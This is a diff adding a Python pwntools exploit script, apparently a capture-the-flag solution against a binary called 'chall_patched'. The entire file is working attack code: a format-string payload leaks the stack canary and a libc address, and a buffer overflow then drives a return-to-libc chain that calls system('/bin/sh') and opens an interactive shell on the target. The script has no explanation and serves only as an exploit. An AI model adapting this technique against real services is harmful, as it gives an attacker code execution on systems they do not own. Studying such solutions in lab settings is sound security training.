@@ -1,0 +1,38 @@
+from pwn import *
+
+# becareful when use fmtstr_payload:
+# must have write_size = short and context.clear
+
+p = remote("0", 4200)
+#p = process("./chall_patched")
+e = ELF("./chall_patched")
+libc = ELF("./libc.so.6")
+'''
+p = gdb.debug("./chall_patched", gdbscript = 
+b *main + 171
+)
+'''
+main = e.symbols['main']
+rw_section = 0x404080
+
+context.clear(arch = 'amd64')
+payload = fmtstr_payload(7, {rw_section: b"%33$p.%23$p."}, write_size = "short")
+p.sendlineafter(b"> ", payload)
+
+canary = int(p.recvuntil(b".")[:-1:], 16)
+libc_base = int(p.recvuntil(b".")[:-1:], 16) - 577219
+
+print(hex(canary), hex(libc_base))
+
+pop_rdi = libc_base + 0x000000000002a3e5
+binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
+system = libc_base + libc.symbols['system']
+ret = pop_rdi + 1
+
+payload = b"A" * 0x28 + p64(canary) + b"B" * 8
+payload += p64(pop_rdi) + p64(binsh)
+payload += p64(ret)
+payload += p64(system)
+p.sendafter(b"another:\n", payload)
+
+p.interactive()
